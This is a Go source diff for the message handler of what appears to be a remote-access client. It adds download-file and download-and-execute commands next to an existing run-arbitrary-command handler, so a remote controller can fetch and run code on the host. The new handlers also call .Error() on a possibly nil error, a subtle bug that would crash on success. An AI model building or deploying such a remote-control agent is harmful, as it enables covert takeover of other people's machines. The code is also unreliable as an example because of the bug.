@@ -1,11 +1,10 @@
 package message
 
 import (
-        "../modules"
-        "../modules/os"
-        "./types"
-        "encoding/gob"
-        "log"
+	"../modules"
+	"./types"
+	"encoding/gob"
+	"log"
 )
 
 /*
@@ -39,16 +38,41 @@ func HandleMessage(messageID byte) (responseID byte, response interface{}) {
  * A gob decoder which can be used to decode into the neccessary structure
  */
 func HandleMessageWithPayload(messageID byte, decoder *gob.Decoder) (responseID byte, response interface{}) {
-        if messageID == types.REQ_RUN_COMMAND {
-                var req types.RunCommandRequest
-                err := decoder.Decode(&req)
-                if err != nil {
-                        log.Printf("error decoding: %s", err)
-                        return types.ERR_GOB, nil
-                }
-                var res types.RunCommandReponse
-                res.Success, res.Response = os.RunCommand(req.Command, req.Backround)
-                return types.RES_RUN_COMMAND, res
-        }
-        return types.ERR_MESSAGE_NOT_HANDLED, nil
+	if messageID == types.REQ_RUN_COMMAND {
+		var req types.RunCommandRequest
+		var res types.RunCommandReponse
+		err := decoder.Decode(&req)
+		if err != nil {
+			log.Printf("error decoding: %s", err)
+			return types.ERR_GOB, nil
+		}
+		res.Success, res.Response = modules.RunCommand(req.Command, req.Backround)
+		return types.RES_RUN_COMMAND, res
+	}
+
+	if messageID == types.REQ_DOWNLOAD_FILE {
+		var req types.DownloadFileRequest
+		var res types.DownloadFileResponse
+		err := decoder.Decode(&req)
+		if err != nil {
+			log.Printf("error decoding: %s", err)
+			return types.ERR_GOB, nil
+		}
+		res.Error = modules.DownloadFile(req.Url, req.Location).Error()
+		return types.RES_DOWNLOAD_FILE, res
+	}
+
+	if messageID == types.REQ_DOWNLOAD_EXECUTE {
+		var req types.DownloadAndExecuteRequest
+		var res types.DownloadAndExecuteResponse
+		err := decoder.Decode(&req)
+		if err != nil {
+			log.Printf( "error decoding: %s", err)
+			return types.ERR_GOB, nil
+		}
+		res.Error = modules.DownloadAndExecute(req.Url, req.Args).Error()
+		return types.RES_DOWNLOAD_EXECUTE, res
+	}
+
+	return types.ERR_MESSAGE_NOT_HANDLED, nil
 }
